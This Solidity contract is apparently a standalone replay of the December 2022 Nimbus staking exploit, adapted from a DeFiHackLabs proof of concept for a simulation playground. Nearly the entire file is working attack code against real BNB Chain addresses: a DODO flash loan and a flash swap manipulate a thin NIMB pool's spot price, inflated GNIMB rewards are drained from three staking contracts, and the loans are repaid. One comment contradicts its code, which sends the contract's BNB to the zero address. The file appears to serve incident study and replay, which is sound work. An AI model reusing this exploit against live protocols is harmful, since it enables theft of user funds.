// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;

// Synthetic standalone exploit for the EVM Playground (2022-12-Nmbplatform).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest` —
// the DODO flash-loan callback `DPPFlashLoanCall` and the WBNB-pair flash-swap
// callback `BiswapCall` live on the test itself, and three helper `User1/2/3`
// contracts do the staking + reward claiming. There is no single standalone
// exploit contract to deploy. This file is a faithful, self-contained copy of
// that inline attack so the playground can deploy it and record `run()`. Logic
// and constants are copied verbatim from test/Nmbplatform_exp.sol. No imports —
// it compiles anywhere.
//
// Root cause: the three Nimbus fixed-APY staking contracts price their reward
// conversion (NIMB -> GNIMB) through PriceFeed.queryRate, which bottoms out at
// the Nimbus AMM's instantaneous `getAmountsOut` spot quote against a THIN NIMB
// pool (only ~265 NBU_WBNB of liquidity). The attacker flash-borrows WBNB,
// dumps ~59,000 NBU_WBNB into the NIMB pool (pumping NIMB's spot price ~50,000x),
// then calls getReward() on each staking contract. The inflated NIMB->GNIMB rate
// makes `earned()` balloon ~49,537x, draining ~10.97M GNIMB. The attacker sells
// NIMB back (restoring the price) and dumps the windfall GNIMB for WBNB, repaying
// both flash loans and keeping ~323.57 WBNB.
//
// REPLAY NOTE — the time-gate. The reward grows with (block.timestamp - stakeTime),
// and the Foundry test `warp`s +8 days after staking. The recorder replays every
// call at ONE block timestamp, so a runtime stake-then-claim gives dt = 0 (zero
// reward). The config therefore PRE-POPULATES this contract's stake records in the
// three staking contracts via setup.storeSlot (stakeTime = fork block time, dt = 8
// days once setup.blockTimestamp warps the replay forward), tops up the staking
// contracts' GNIMB so the inflated payout is realizable, and `run()` performs only
// the flash-loan price manipulation + claims + unwind + repay. `run()` is called as
// this contract (msg.sender), which is the staker of record, so getReward() pays
// the GNIMB here. This contract is the staker in all three contracts.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface NimbusBNB is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface IStaking {
    function getReward() external;
    function earned(address account) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

interface IUniPairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

contract NimbStakingRewardDrain {
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IWBNB constant WBNB_W = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 constant GNIMB = IERC20(0x99C486b908434Ae4adF567e9990A929854d0c955);
    IERC20 constant NIMB = IERC20(0xCb492C701F7fe71bC9C4B703b84B0Da933fF26bB);
    NimbusBNB constant NBU_WBNB = NimbusBNB(0xA2CA18FC541B7B101c64E64bBc2834B05066248b);
    IRouter constant NimbusRouter = IRouter(0x2C6cF65f3cD32a9Be1822855AbF2321F6F8f6b24);
    IUniPairV2 constant Pair = IUniPairV2(0xaCAac9311b0096E04Dfe96b6D87dec867d3883Dc); // WBNB pair (flash-swap source)
    IStaking constant stakingReward1 = IStaking(0x3aA2B9de4ce397d93E11699C3f07B769b210bBD5);
    IStaking constant stakingReward2 = IStaking(0x706065716569f20971F9CF8c66D092824c284584);
    IStaking constant stakingReward3 = IStaking(0xdEF57A7722D4411726ff40700Eb7b6876BEE7ECB);
    address constant dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4; // DODO DPP (flash-loan source)

    uint256 flashLoanAmount; // WBNB borrowed from DODO
    uint256 flashSwapAmount; // WBNB pulled from the WBNB pair

    // Single recorded entrypoint: the flash-loan price manipulation. Assumes the
    // three staking records for this contract are pre-populated (setup.storeSlot)
    // and the staking contracts are topped up with GNIMB (setup.dealToken).
    function run() external {
        flashLoanAmount = WBNB.balanceOf(dodo);
        IDVM(dodo).flashLoan(flashLoanAmount, 0, address(this), new bytes(1));
    }

    // ---- DODO DPP flash-loan callback ----------------------------------------
    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        // Pull the rest of the working capital from the WBNB pair via a flash swap.
        flashSwapAmount = WBNB.balanceOf(address(Pair)) - 1e18;
        Pair.swap(flashSwapAmount, 0, address(this), new bytes(1));
        // Repay DODO.
        WBNB.transfer(dodo, flashLoanAmount);
    }

    // ---- WBNB pair flash-swap callback (Nimbus / Biswap style) ---------------
    // The pair calls back here with the optimistically-sent WBNB. This is where the
    // manipulation, claims, unwind, and final repayment happen.
    function BiswapCall(address, uint256, uint256, bytes calldata) external {
        // Source all BNB to the pair callback sender (self) — defensive, matches test.
        payable(address(0)).transfer(address(this).balance);
        // Unwrap the flash-borrowed WBNB -> BNB, then re-wrap into NBU_WBNB. This is
        // the working capital (~59,092 NBU_WBNB) used to pump the NIMB pool.
        WBNB_W.withdraw(WBNB.balanceOf(address(this)));
        NBU_WBNB.deposit{value: address(this).balance}();
        NBU_WBNB.approve(address(NimbusRouter), type(uint256).max);

        // --- Manipulate the NIMB spot price (the bug) -------------------------
        // Dump ~59,000 NBU_WBNB into the thin NIMB pool, pumping NIMB ~50,000x. The
        // staking contracts' reward oracle reads this pumped price moments later.
        address[] memory path = new address[](2);
        path[0] = address(NBU_WBNB);
        path[1] = address(NIMB);
        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            NBU_WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // Claim the inflated reward from each staking contract. The GNIMB payout is
        // sized by the manipulated NIMB->GNIMB rate (~49,537x honest). Each contract
        // is topped up with GNIMB via setup.dealToken before run() so the inflated
        // claim is fully realizable (the original test `deal`s/transfers the same).
        stakingReward1.getReward();
        stakingReward2.getReward();
        stakingReward3.getReward();

        // --- Unwind: sell the pumped NIMB back for NBU_WBNB ------------------
        NIMB.approve(address(NimbusRouter), type(uint256).max);
        path[0] = address(NIMB);
        path[1] = address(NBU_WBNB);
        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            NIMB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // Dump the windfall GNIMB for NBU_WBNB.
        GNIMB.approve(address(NimbusRouter), type(uint256).max);
        path[0] = address(GNIMB);
        path[1] = address(NBU_WBNB);
        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            GNIMB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // Unwrap NBU_WBNB -> BNB -> WBNB, then repay the WBNB pair flash swap
        // (principal + 0.2% Nimbus fee).
        NBU_WBNB.withdraw(NBU_WBNB.balanceOf(address(this)));
        address(WBNB).call{value: address(this).balance}("");
        WBNB.transfer(address(Pair), flashSwapAmount * 1000 / 998 + 1000);
    }

    receive() external payable {}
}
